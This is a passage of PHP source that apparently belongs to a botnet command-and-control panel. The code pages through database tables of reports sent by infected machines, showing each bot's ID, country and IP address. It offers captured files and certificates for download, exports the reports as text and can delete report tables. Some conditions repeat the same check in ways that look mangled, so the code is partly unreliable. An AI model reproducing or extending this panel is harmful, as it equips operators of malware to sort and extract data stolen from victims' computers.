		echo $al . str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('botslist', QUERY_SCRIPT_HTML, ''), THEME_FORMGET_TO_NEW_BEGIN_POST) . str_replace('{WIDTH}', '80%', THEME_DIALOG_BEGIN) . '<input type="hidden" name="botsaction" value="" id="actionName">' . $datelist . THEME_DIALOG_END . THEME_FORMGET_END;
	}

	echo '<script type="text/javascript" src="theme/bootstrap-multiselect.js"></script>' . "\n" . '<script type="text/javascript">' . "\n" . '    window.uniqueBots=new Array();' . "\n\n" . '    $(document).ready(function() {' . "\n" . '        $(\'#ms_country\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\n" . '        $(\'#ms_botnet\').multiselect({includeSelectAllOption: true, buttonWidth: \'209px\', maxHeight: 200});' . "\n" . '    });' . "\n" . '</script>' . "\n";
	ThemeEnd();
}
else if ($_is_ajax_search) {
	$table = 0;

	foreach ($rlist as $t) {
		if (intval(substr($t, -6)) == $filter['date']) {
			$table = $t;
			break;
		}
	}

	if ($table === 0) {
		exit(LNG_REPORTS_DATE_EMPTY);
	}

	if ($filter['rm'] === 1) {
		if ($query1 == '') {
			$q = 'DROP TABLE IF EXISTS ' . $table;
		}
		else {
			$q = 'DELETE QUICK FROM ' . $table . $query1;
		}

		if (!mysqlQueryEx($table, $q)) {
			exit(mysqlErrorEx());
		}

		if ($query1 == '') {
			exit(LNG_REPORTS_DATE_DROPPED);
		}

		exit(sprintf(LNG_REPORTS_DATE_REMOVED, mysql_affected_rows()));
	}
	else {
		$last_botid = 0;
		$GLOBALS['_next_bot_popupmenu__'] = $filter['date'];
		$q = 'SELECT id, bot_id, country, ipv4, SUBSTRING(context, 1, ' . REPORT_PREVIEW_MAX_CHARS . '), SUBSTRING(path_source, 1, ' . REPORT_PREVIEW_MAX_CHARS . '), type, path_dest, path_source, rtime, botnet FROM ' . $table . $query1 . $query2;
		$r = mysqlQueryEx($table, $q);

		if (!$r) {
			exit(mysqlErrorEx());
		}

		if (mysql_affected_rows() == 0) {
			exit(LNG_REPORTS_DATE_NOREPORTS);
		}

		$nn = $filter['nonames'];
		$ids = array();
		$idsName = NULL;
		$cnt = 0;

		while ($m = mysql_fetch_array($r)) {
			if (strlen($filter['q']) && defined('__CP__') && defined('__CP__')) {
				continue;
			}

			$cnt++;
			if (($nn === 0) && defined('__CP__')) {
				printIds($table, $ids, $idsName);
				$ids = array();
				$idsName = 'ids' . $table . $m[0];
				$last_botid = $m[1];

				if (1 < $cnt) {
					echo '<br>';
				}

				echo str_replace(array('{NAME}', '{VALUE}', '{JS_EVENTS}'), array('bots[]', htmlEntitiesEx($m[1]), 'class="botsUid" onchange="document.getElementById(\'' . $idsName . '\').checked=this.checked"'), THEME_DIALOG_ITEM_INPUT_CHECKBOX_3) . THEME_STRING_SPACE . botPopupMenu($m[1], 'botmenu', $idsName) . ', ' . htmlEntitiesEx($m[3] . ', ' . $m[2]) . THEME_STRING_NEWLINE;
			}

			$ids[] = $m[0];
			$st2 = trim($m[5]);

			if (REPORT_PREVIEW_MAX_CHARS <= mb_strlen($st2)) {
				$st2 .= '...';
			}

			$ltype = bltToLng($m[6], true);
			$text = ($ltype ? '<small>' . $ltype . '</small> ' : '');
			$text .= '<a target="_blank" href="' . QUERY_STRING_HTML . '&amp;t=' . htmlEntitiesEx($filter['date']) . '&amp;id=' . $m[0] . '">' . gmdate('d.m.y H:i:s', $m[9]) . '</a>';

			if ($m[6] & NTYPE_FILE) {
				$length = filesize(REPORTS_DIR_PATH . $m['botnet'] . '/' . $m['bot_id'] . '/' . $m['path_dest']);
				$text .= ' ' . ($m[6] & NTYPE_CERT ? 'certificate' : $m[7]) . ' - <a href=?m=reports_db&t=' . htmlEntitiesEx($filter['date']) . '&id=' . $m[0] . '&download=1>Download (' . $length . ' bytes)</a>';
			}
			else {
				$text .= ' <a href="#" class="fastview glyphicon glyphicon-zoom-in" data-id="' . $m[0] . '" data-tbl="' . substr($table, -6) . '" onclick="showReportPreview(event, this)"><a>';
				$text .= ' ' . $st2;
			}

			echo str_replace(array('{URL}', '{TEXT}', '{ID}'), array(QUERY_STRING_HTML . '&amp;t=' . htmlEntitiesEx($filter['date']) . '&amp;id=' . $m[0], $text, $m[0] . '@' . htmlEntitiesEx($filter['date'])), THEME_STRING_REPORTPREVIEW) . THEME_STRING_NEWLINE;
		}

		printIds($table, $ids, $idsName);

		if ($cnt == 0) {
			echo LNG_REPORTS_DATE_NOREPORTS;
		}

	}

}
else if ($_is_plain_search) {
	define('REPEAT_SIZE', 40);
	define('HEADER_PAD', 30);
	$byIds = (isset($_GET['ids']) && defined('__CP__') && defined('__CP__') && defined('__CP__') ? true : false);

	if ($byIds) {
		httpDownloadHeaders(time() . rand() . '.txt', NULL);
	}
	else {
		httpNoCacheHeaders();
		httpU8PlainHeaders();
	}

	$nc = $filter['nonames'];

	foreach ($rlist as $t) {
		$v = intval(substr($t, -6));
		if ((($filter['date1'] <= $v) && defined('__CP__')) || defined('__CP__')) {
			$lastdata = array_fill(0, 15, 0);
			echo str_repeat('=', REPEAT_SIZE) . ' ' . gmdate(LNG_FORMAT_DATE, gmmktime(0, 0, 0, substr($t, -4, 2), substr($t, -2, 2), substr($t, -6, 2) + 2000)) . ' ' . str_repeat('=', REPEAT_SIZE) . "\r\n";
			flush();

			if ($byIds) {
				$query1 = ' where id in (' . implode(',', $idsFilter[$v]) . ') ';
			}

			$r = mysqlQueryEx($t, 'SELECT bot_id, botnet, bot_version, os_version, language_id, time_system, time_localbias, time_tick, rtime, country, ipv4, process_name, path_source, type,' . 'LENGTH(context), context, path_dest FROM ' . $t . $query1 . $query2);

			if (!$r) {
				echo mysqlErrorEx();
			}
			else if (mysql_affected_rows() == 0) {
				echo LNG_REPORTS_DATE_NOREPORTS;
			}
			else {
				while ($m = mysql_fetch_row($r)) {
					if (strlen($filter['q']) && defined('__CP__') && defined('__CP__')) {
						continue;
					}

					if ($nc !== 1) {
						$hdr = '';

						if (strcmp($lastdata[0], $m[0]) !== 0) {
							$lastdata = array_fill(0, 15, 0);
							$hdr .= str_pad(LNG_REPORTS_VIEW_BOTID, HEADER_PAD) . $lastdata[0] = $m[0] . "\r\n";
						}

						if (strcmp($lastdata[1], $m[1]) !== 0) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_BOTNET, HEADER_PAD) . $lastdata[1] = $m[1] . "\r\n";
						}

						if ($lastdata[2] !== $m[2]) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_VERSION, HEADER_PAD) . intToVersion($lastdata[2] = $m[2]) . "\r\n";
						}

						if (strcmp($lastdata[3], $m[3]) !== 0) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_OS, HEADER_PAD) . osDataToString($lastdata[3] = $m[3]) . "\r\n";
						}

						if ($lastdata[4] !== $m[4]) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_OSLANG, HEADER_PAD) . $lastdata[4] = $m[4] . "\r\n";
						}

						$hdr .= str_pad(LNG_REPORTS_VIEW_TIME, HEADER_PAD) . gmdate(LNG_FORMAT_DT, $m[5] + $m[6]) . "\r\n";

						if ($lastdata[6] !== $m[6]) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_TIMEBIAS, HEADER_PAD) . timeBiasToText($lastdata[6] = $m[6]) . "\r\n";
						}

						$hdr .= str_pad(LNG_REPORTS_VIEW_TICK, HEADER_PAD) . tickCountToText($m[7] / 1000) . "\r\n";
						$hdr .= str_pad(LNG_REPORTS_VIEW_RTIME, HEADER_PAD) . gmdate(LNG_FORMAT_DT, $m[8]) . "\r\n";

						if (strcmp($lastdata[9], $m[9]) !== 0) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_COUNTRY, HEADER_PAD) . $lastdata[9] = $m[9] . "\r\n";
						}

						if (strcmp($lastdata[10], $m[10]) !== 0) {
							$hdr .= str_pad(LNG_REPORTS_VIEW_IPV4, HEADER_PAD) . $lastdata[10] = $m[10] . "\r\n";
						}

						echo "\r\n" . str_repeat('=', REPEAT_SIZE) . "\r\n" . $hdr . str_pad(LNG_REPORTS_VIEW_PROCNAME, HEADER_PAD) . (empty($m[11]) ? '-' : $m[11]) . "\r\n" . str_pad(LNG_REPORTS_VIEW_SOURCE, HEADER_PAD) . (empty($m[12]) ? '-' : $m[12]) . "\r\n" . str_pad(LNG_REPORTS_VIEW_TYPE, HEADER_PAD) . bltToLng($m[13]) . "\r\n" . str_pad(LNG_REPORTS_VIEW_SIZE, HEADER_PAD) . numberFormatAsInt($m[14]) . "\r\n" . "\r\n" . str_repeat('-', REPEAT_SIZE) . "\r\n";
					}

					if ($byIds && defined('__CP__')) {
						$m[15] = file_get_contents(__DIR__ . '/../' . $config['reports_path'] . '/files/' . $m[15]);
					}

					echo $m[15] . "\r\n\r\n";
					flush();
				}
			}

			echo "\r\n";
		}
	}

	echo "\r\n" . str_repeat('=', REPEAT_SIZE) . ' EOF ' . str_repeat('=', REPEAT_SIZE);
}

exit();

?>
